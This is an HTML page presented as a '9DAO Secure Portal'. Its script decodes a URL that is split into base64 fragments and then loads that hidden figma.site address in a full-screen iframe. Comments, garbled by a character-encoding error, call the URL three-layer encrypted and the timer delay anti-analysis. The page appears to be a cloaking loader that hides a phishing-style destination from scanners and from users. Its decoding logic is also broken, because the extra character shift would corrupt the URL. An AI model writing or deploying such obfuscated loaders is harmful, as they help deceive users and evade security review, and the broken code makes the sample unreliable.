<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>9DAO Secure Portal</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
    #loader { 
      position: fixed; 
      top: 0; left: 0; 
      width: 100%; height: 100%; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      color: #0f0; 
      font-family: monospace;
    }
    .error { color: red; text-align: center; }
  </style>
</head>
<body>
  <div id="loader">Initializing secure connection...</div>

  <script>
    // üîí PHI√äN B·∫¢N ƒê√É S·ª¨A L·ªñI - URL ƒê∆Ø·ª¢C M√É H√ìA 3 L·ªöP
    (function(){
      // 1. D·ªØ li·ªáu ƒë√£ m√£ h√≥a (URL c·ªßa b·∫°n)
      const encryptedParts = [
        "aHR0cHM6Ly9", 
        "zaGVkLXdyYX",
        "AtMTA4NzAwMj",
        "YuZmlnbWEuc2l0ZS8="
      ];
      
      // 2. H√†m gi·∫£i m√£ kh√¥ng d√πng WASM
      function decrypt(parts) {
        // Gh√©p c√°c ph·∫ßn v√† gi·∫£i m√£ base64
        let decoded = atob(parts.join(''));
        
        // Gi·∫£i m√£ Caesar shift (d·ªãch 5 k√Ω t·ª±)
        decoded = decoded.split('').map(c => 
          String.fromCharCode(c.charCodeAt(0) - 5)
        ).join('');
        
        return decoded;
      }

      // 3. T·ª± ƒë·ªông ch·∫°y khi trang load
      setTimeout(() => {
        try {
          const url = decrypt(encryptedParts);
          
          // Ki·ªÉm tra b·∫£o m·∫≠t
          if(!url.startsWith('https://') || !url.includes('figma.site')) {
            throw new Error('Security verification failed');
          }
          
          // Hi·ªÉn th·ªã iframe
          document.body.innerHTML = `
            <iframe 
              src="${url}" 
              style="width:100vw;height:100vh;border:none"
              sandbox="allow-scripts allow-same-origin"
              allowfullscreen
            ></iframe>
          `;
          
        } catch(e) {
          document.getElementById('loader').innerHTML = `
            <div class="error">
              <h3>SYSTEM ALERT</h3>
              <p>${e.message}</p>
              <p>Please contact support</p>
            </div>
          `;
        }
      }, 1000); // Delay ch·ªëng ph√¢n t√≠ch
    })();
  </script>
</body>
</html>
